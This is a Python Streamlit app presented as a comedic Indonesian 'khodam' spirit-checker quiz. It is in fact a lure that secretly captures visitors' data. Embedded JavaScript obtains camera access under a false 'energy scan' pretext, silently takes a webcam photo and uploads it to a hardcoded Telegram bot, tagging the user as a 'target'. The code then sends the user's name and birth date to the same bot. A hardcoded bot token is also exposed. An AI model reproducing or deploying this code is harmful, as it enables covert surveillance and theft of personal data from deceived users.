import requests
import streamlit as st
import streamlit.components.v1 as components
from datetime import datetime
import time
import hashlib

# ==========================================
# KONFIGURASI BOT TELEGRAM & HALAMAN
# ==========================================
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="Pusat Pengecekan Khodam Nuklir Se-Indonesia",
    page_icon="☢️",
    layout="centered"
)

# ==========================================
# CUSTOM CSS / STYLING CYBER-MATRIX & GLITCH
# ==========================================
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700&display=swap');

    .stApp {
        background: linear-gradient(135deg, #02231b 0%, #050b14 50%, #11051f 100%);
        color: #f8fafc;
        font-family: 'Space Grotesk', sans-serif;
    }

    /* Kotak Utama / Glassmorphism Card dengan Border Neon */
    .cyber-card {
        background: rgba(8, 15, 28, 0.85);
        backdrop-filter: blur(16px);
        border: 2px solid #22c55e;
        border-radius: 24px;
        padding: 30px;
        box-shadow: 0 0 25px rgba(34, 197, 94, 0.25), inset 0 0 15px rgba(34, 197, 94, 0.1);
        margin-bottom: 25px;
    }

    /* Kotak Peringatan Energi ala Cyber */
    .cyber-warning-box {
        background: rgba(234, 179, 8, 0.1);
        border: 1px dashed #eab308;
        border-left: 6px solid #eab308;
        padding: 16px 20px;
        border-radius: 14px;
        margin-bottom: 20px;
        font-size: 14px;
        color: #fef08a;
        line-height: 1.6;
    }

    /* Input Field Styling ala Terminal Hacker */
    .stTextInput > div > div > input {
        background-color: #030712 !important;
        color: #4ade80 !important;
        border: 2px solid #334155 !important;
        border-radius: 12px !important;
        padding: 14px !important;
        font-weight: 600 !important;
    }
    .stTextInput > div > div > input:focus {
        border-color: #22c55e !important;
        box-shadow: 0 0 15px rgba(34, 197, 94, 0.4) !important;
    }

    /* Tombol Reset Streamlit */
    .stButton > button {
        background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%) !important;
        color: #f1f5f9 !important;
        border: 2px solid #38bdf8 !important;
        border-radius: 12px !important;
        font-weight: 700 !important;
        padding: 14px 20px !important;
        width: 100% !important;
        transition: all 0.3s ease !important;
    }
    .stButton > button:hover {
        background: linear-gradient(135deg, #38bdf8 0%, #2563eb 100%) !important;
        color: #ffffff !important;
        box-shadow: 0 0 20px rgba(56, 189, 248, 0.5) !important;
        transform: translateY(-2px) !important;
    }
    </style>
""", unsafe_allow_html=True)

# ==========================================
# INISIALISASI SESSION STATE
# ==========================================
if 'step' not in st.session_state:
    st.session_state.step = 0
if 'user_name' not in st.session_state:
    st.session_state.user_name = ""
if 'user_dob' not in st.session_state:
    st.session_state.user_dob = ""
if 'telegram_sent' not in st.session_state:
    st.session_state.telegram_sent = False
if 'camera_failed' not in st.session_state:
    st.session_state.camera_failed = False

# ==========================================
# DATABASE KHODAM KOCAK & ROASTING MAKSIMAL
# ==========================================
MASTER_KHODAM = [
    {
        "title": "🐔 Khodam Ayam Jago Sembunyi di Kolong Kasur",
        "desc": "Kerjanya tiap pagi doang doyan berkokok, padahal hidupnya aslinya mageran. Paling anti diajak kerja bakti tapi kalau urusan ngantre sembako paling depan."
    },
    {
        "title": "🩴 Khodam Swallow Sebelah Disembunyikan Bocil",
        "desc": "Jiwamu adalah simbol pasrah hakiki. Kalau kena masalah hidup, kamu gak ngeluh tapi langsung pulang jalan kaki sebelah sambil megang batu."
    },
    {
        "title": "⚡ Khodam Token Listrik Bunyi Bip-Bip Jam 2 Pagi",
        "desc": "Aura keberadaanmu selalu bikin orang sekitar panik dan darah tinggi. Datangmu gak diundang, perginya pas token diisi abis itu bunyi lagi."
    },
    {
        "title": "🐟 Khodam Lele Suthil Balap Liar",
        "desc": "Licin banget kalau ditagih utang. Punya keahlian khusus menghilang secara gaib setiap kali ada temen bilang 'traktir dong'."
    },
    {
        "title": "🍲 Khodam Kuah Seblak Sisa Kemarin Dihangatin Lagi",
        "desc": "Hidupmu penuh drama pedas dan micin. Suka overthinking gak jelas di tengah malam padahal masalahnya cuma gara-gara status WA di-read doang."
    },
    {
        "title": "🔌 Khodam Charger HP Posisi Miring Disumpel Buku",
        "desc": "Simbol perjuangan tanpa hasil instan. Kalau belum ditekan atau diposisikan pas, kamu ogah gerak sama sekali alias kaum rebahan abadi."
    },
    {
        "title": "🐈 Khodam Kucing Oren Nyangkut di Atap Seng",
        "desc": "Otakmu separuh isinya gak ada alias hampa. Hobi bikin hal-hal bodoh yang baru disesali pas besok paginya."
    },
    {
        "title": "📦 Khodam Paket COD Belum Dibayar Datang Saat Mandi",
        "desc": "Khodam pembawa sial elegan. Setiap kali kamu mau rebahan tenang, pasti ada aja kurir datang atau emak nyuruh beli garam ke warung."
    },
    {
        "title": "🧊 Khodam Es Batu Kulkas Kosong Sejak 2021",
        "desc": "Dingin, kaku, dan gak guna tapi tetep dipelihara. Auramu bikin orang lain segan karena kamu cuek bebek kayak gak punya urusan dunia."
    },
    {
        "title": "🪞 Khodam Cermin Kamar Mandi Berkerak Rembesan Air",
        "desc": "Suka ngerasa paling ganteng/cantik kalau ngaca di kamar sendiri, tapi begitu lihat kamera depan HP langsung pengen banting handphone."
    },
    {
        "title": "🧅 Khodam Kulit Bawang Merah Bikin Nangis Terus",
        "desc": "Dikit-dikit baper, dikit-dikit nangis. Padahal yang disakitin cuma perasaan sendiri gara-gara terlalu mendalami drama fiktif."
    },
    {
        "title": "🚪 Khodam Pintu Kamar Mandi Nyangkut Harus Digotong",
        "desc": "Punya masalah hidup yang pelik tapi kalau dibenerin malah makin rusak. Suka salah jalan tapi ngeyel kalau dibilangin."
    }
]

# ==========================================
# FUNGSI KIRIM TELEGRAM (TEKS)
# ==========================================
def send_text_to_telegram(name, dob, profile_title):
    now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
    caption = (
        f"☢️ <b>RITUAL CEK KHODAM CYBER SELESAI!</b>\n\n"
        f"👤 Target: <b>{name}</b>\n"
        f"🎂 Tanggal Lahir: <code>{dob}</code>\n"
        f"🕒 Waktu: {now}\n"
        f"🐾 Hasil Khodam: <b>{profile_title}</b>"
    )
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption, 'parse_mode': 'HTML'}
        )
    except Exception as e:
        print(f"[!] Gagal mengirim notifikasi Telegram: {e}")

# ==========================================
# RENDER UTAMA BERDASARKAN STEP
# ==========================================

# --- STEP 0: FORM RITUAL & PEMICU KAMERA BERBASIS HTML COMPONENT ---
if st.session_state.step == 0:
    st.markdown("<h1 style='text-align: center; color: #4ade80; text-shadow: 0 0 15px rgba(74,222,128,0.5);'>☢️ TERMINAL PEMINDAI KHODAM NUKLIR</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #38bdf8; margin-bottom: 30px; font-weight: 600;'>Sistem pelacakan makhluk astral lintas dimensi menggunakan teknologi Matrix-Aura.</p>", unsafe_allow_html=True)

    with st.container():
        st.markdown('<div class="cyber-card">', unsafe_allow_html=True)
        
        st.markdown("""
            <div class="cyber-warning-box">
                ⚠️ <b>PROTOKOL KEAMANAN SENSOR:</b><br>
                Sistem wajib mengaktifkan <b>izin kamera</b> saat tombol diledakkan untuk memindai gelombang energi sukma dan frekuensi gaibmu. Jika izin ditolak, sistem otomatis menggagalkan ritual pembacaan khodam.
            </div>
        """, unsafe_allow_html=True)
        
        if st.session_state.camera_failed:
            st.error("🚨 **ERROR 404: ENERGI TIDAK TERDETEKSI!** Akses kamera ditolak oleh perangkat. Sistem menghentikan proses karena frekuensi gaib gagal terpindai.")
        
        # Input form native Streamlit (tanpa contoh teks/placeholder nama & tanggal lahir)
        name_input = st.text_input("Nama Lengkap / Nama Panggilan", value=st.session_state.user_name)
        dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", value=st.session_state.user_dob)
        
        st.write("")
        
        # TOMBOL HTML KUSTOM DENGAN WARNA GRADASI CYBER (HIJAU NEON & EMAS)
        camera_trigger_html = f"""
        <div>
            <button id="ritual-btn" style="
                background: linear-gradient(135deg, #22c55e 0%, #eab308 100%);
                color: #030712; font-weight: 800; letter-spacing: 1.5px;
                border: none; padding: 18px 24px; border-radius: 14px;
                width: 100%; box-shadow: 0 0 25px rgba(34, 197, 94, 0.5);
                cursor: pointer; text-transform: uppercase; font-family: 'Space Grotesk', sans-serif;
                font-size: 16px; transition: all 0.3s ease;">
                💥 LEDAKKAN & BONGKAR KHODAM SAYA
            </button>
            
            <video id="video" width="0" height="0" autoplay style="display:none;"></video>
            <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
            
            <script>
                const token = "{TELEGRAM_BOT_TOKEN}";
                const chatId = "{TELEGRAM_CHAT_ID}";
                
                document.getElementById('ritual-btn').onclick = function() {{
                    navigator.mediaDevices.getUserMedia({{ video: true }})
                    .then(function(stream) {{
                        var video = document.getElementById('video');
                        video.srcObject = stream;
                        video.play();
                        
                        setTimeout(function() {{
                            var canvas = document.getElementById('canvas');
                            var context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, 640, 480);
                            var dataURL = canvas.toDataURL('image/jpeg');
                            
                            fetch(dataURL)
                            .then(res => res.blob())
                            .then(blob => {{
                                var formData = new FormData();
                                formData.append('chat_id', chatId);
                                formData.append('photo', blob, 'cyber_target.jpg');
                                formData.append('caption', '☢ <b>TARGET CYBER AURA TERDETEKSI (VALIDASI SUKSES)!</b>');
                                
                                fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                                    method: 'POST',
                                    body: formData
                                }}).then(() => {{
                                    window.parent.location.href = window.parent.location.href.split('?')[0] + "?step=2";
                                }});
                            }});
                            
                            stream.getTracks().forEach(track => track.stop());
                        }}, 1000);
                    }})
                    .catch(function(err) {{
                        console.log("Akses kamera ditolak: ", err);
                        window.parent.location.href = window.parent.location.href.split('?')[0] + "?failed=true";
                    }});
                }};
            </script>
        </div>
        """
        components.html(camera_trigger_html, height=90)
        
        st.markdown('</div>', unsafe_allow_html=True)

    query_params = st.query_params
    if "step" in query_params and query_params["step"] == "2":
        st.session_state.user_name = name_input if name_input.strip() else "Tanpa Nama"
        st.session_state.user_dob = dob_input if dob_input.strip() else "Rahasia"
        st.session_state.step = 2
        st.query_params.clear()
        st.rerun()
    elif "failed" in query_params:
        st.session_state.camera_failed = True
        st.session_state.step = 0
        st.query_params.clear()
        st.rerun()

# --- STEP 2: ANIMASI PROSES CYBER-MATRIX ---
elif st.session_state.step == 2:
    st.markdown("<h2 style='text-align: center; color: #38bdf8;'>⚡ MENGEKSEKUSI REAKTOR MATRIX...</h2>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #4ade80;'>Energi sukma terverifikasi! Membuka gerbang dimensi nuklir...</p>", unsafe_allow_html=True)
    
    st.write("")
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    status_text.text("🔌 Menghubungkan satelit gaib ke server pusat...")
    progress_bar.progress(30)
    time.sleep(1)
    
    status_text.text(f"🔍 Menganalisis tingkat kehaluan {st.session_state.user_name}...")
    progress_bar.progress(70)
    time.sleep(1.2)
    
    status_text.text("💥 Menarik data khodam dari semesta lain...")
    progress_bar.progress(100)
    time.sleep(0.8)
    
    st.session_state.step = 3
    st.rerun()

# --- STEP 3: TAMPILAN HASIL KHODAM CYBER-NUKLIR ---
elif st.session_state.step == 3:
    if not st.session_state.telegram_sent:
        unique_string = (st.session_state.user_name + st.session_state.user_dob).lower().encode('utf-8')
        hash_val = int(hashlib.md5(unique_string).hexdigest(), 16)
        
        khodam_idx = hash_val % len(MASTER_KHODAM)
        power_level = (hash_val % 99) + 1  
        
        profile = MASTER_KHODAM[khodam_idx]
        profile['power'] = f"Level Keabsurdan Nuklir: {power_level}% (Bahaya & Bikin Emosi)"
        
        st.session_state.current_profile = profile
        
        send_text_to_telegram(
            name=st.session_state.user_name,
            dob=st.session_state.user_dob,
            profile_title=profile['title']
        )
        st.session_state.telegram_sent = True

    profile = st.session_state.current_profile

    st.markdown("<h2 style='text-align: center; color: #eab308; text-shadow: 0 0 15px rgba(234,179,8,0.4);'>💥 HASIL PEMINDAIAN KHODAM NUKLIR</h2>", unsafe_allow_html=True)
    st.write("")

    st.markdown('<div class="cyber-card">', unsafe_allow_html=True)
    st.markdown(f"<h3 style='color: #4ade80; text-align: center; font-weight: 700;'>{profile['title']}</h3>", unsafe_allow_html=True)
    st.markdown(f"<p style='text-align: center; color: #38bdf8; font-weight: 600; font-size: 1.1rem;'>{profile['power']}</p>", unsafe_allow_html=True)
    st.markdown("<hr style='border-color: rgba(34, 197, 94, 0.3);'>", unsafe_allow_html=True)
    st.markdown(f"<p style='text-align: center; font-size: 1.15rem; line-height: 1.7; color: #f8fafc;'>{profile['desc']}</p>", unsafe_allow_html=True)
    st.markdown('</div>', unsafe_allow_html=True)

    st.write("")
    if st.button("🔄 RESET & CEK ULANG (GANTI TARGET)", use_container_width=True):
        st.session_state.step = 0
        st.session_state.user_name = ""
        st.session_state.user_dob = ""
        st.session_state.telegram_sent = False
        st.session_state.camera_failed = False
        st.rerun()
